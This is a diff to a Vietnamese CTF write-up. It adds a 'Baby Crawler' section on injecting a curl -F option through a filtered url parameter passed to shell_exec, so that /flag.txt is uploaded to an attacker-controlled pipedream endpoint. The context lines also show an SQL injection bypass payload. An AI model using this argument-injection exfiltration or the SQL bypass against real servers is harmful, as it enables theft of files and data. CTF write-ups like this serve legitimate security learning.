@@ -25,6 +25,7 @@
 - [Command Limit Length](#command-limit-length)
 - [Brute-force Basic Authentication](#brute-force-basic-authentication)
 - [Neonify](#neonify)
+- [Baby Crawler](#baby-crawler)
 ## Baby Address Note
 
 1. Dựa vào source code biết được bài này là sql injection. Với câu truy vấn `f"SELECT * FROM users WHERE uid='{uid}';"` ta có thể bypass bằng `' OR '1'='1' --`
@@ -290,5 +291,15 @@ end
 5. Nhưng khi gửi requeset thì lại dính 400. Ta sẽ url encode payload đằng sau. Và thành công lấy được flag ở `/flag.txt`
 ![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/78598ffb-d47f-409d-9835-eb9dca1af962)
 ![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/fe89d6df-5e80-406e-8aa5-42326733b2d2)
+
+## Baby Crawler
+
+1. Bài này có chức năng crawl một trang web về rồi lưu vào file trên server, endpoint `?debug` cho chúng ta biết source code
+2. Trong source code chú ý đoạn xử lý input vào của tham số url.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/613df02d-39d4-4a7e-8411-50c7d9b5e6ab)
+3. Ta nhận thấy tham số url trước khi được truyền vào hàm shell_exec thì đã được filter các ký tự nhằm ngăn chặn command injection -> Do đó ta không thể injection bằng cách kết thúc câu lệnh curl rồi thực hiện câu lệnh khác được.
+4. Như vậy phải tìm cách injection thẳng vào command curl. Được biết curl có một option -F cho phép gửi file trong http request. Ta sẽ craft một payload để curl gửi file chứa flag tới 1 host mà ta kiếm soát.
+`http://103.97.125.53:30244/ -F file=@/flag.txt https://eoxgnbd07mhnjeq.m.pipedream.net`
+5. Trên pipedream ta có thể băt được request chứa url tới file được gửi từ phía server. Mở ra thì lấy được flag.
 
 ## 
